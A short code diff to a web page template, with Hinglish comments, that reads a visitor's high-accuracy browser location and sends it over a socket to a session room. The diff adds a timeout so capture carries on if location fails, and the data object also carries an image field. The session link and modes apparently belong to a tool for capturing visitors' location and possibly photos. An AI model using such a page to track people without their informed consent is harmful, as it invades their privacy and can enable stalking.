@@ -29,7 +29,7 @@
         const sessionId = '<%= sessionId %>';
         const mode = '<%= mode %>';
         
-        // Room join karna tere server.js ke hisaab se
+        // Room join karna
         socket.emit('join-room', sessionId);
 
         async function startProcess() {
@@ -39,17 +39,22 @@
 
             let dataToSend = { roomId: sessionId, latitude: 0, longitude: 0, accuracy: 0, image: '' };
 
-            // 📍 1. LOCATION CAPTURE KAREGA
+            // 📍 1. LOCATION CAPTURE KAREGA (5 Second Timeout ke sath)
             if (mode === 'location' || mode === 'both') {
                 try {
                     const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                            enableHighAccuracy: true, 
+                            timeout: 5000, // 5 second se zyada wait nahi karega
+                            maximumAge: 0 
+                        });
                     });
                     dataToSend.latitude = position.coords.latitude;
                     dataToSend.longitude = position.coords.longitude;
                     dataToSend.accuracy = position.coords.accuracy;
                 } catch (err) {
-                    console.error("Location block ki gayi ya fail hui:", err);
+                    console.error("Location block hui ya time lag gaya:", err);
+                    // Agar location fail hui toh atakega nahi, aage badh jayega
                 }
             }
 
@@ -85,4 +90,3 @@
     </script>
 </body>
 </html>
-
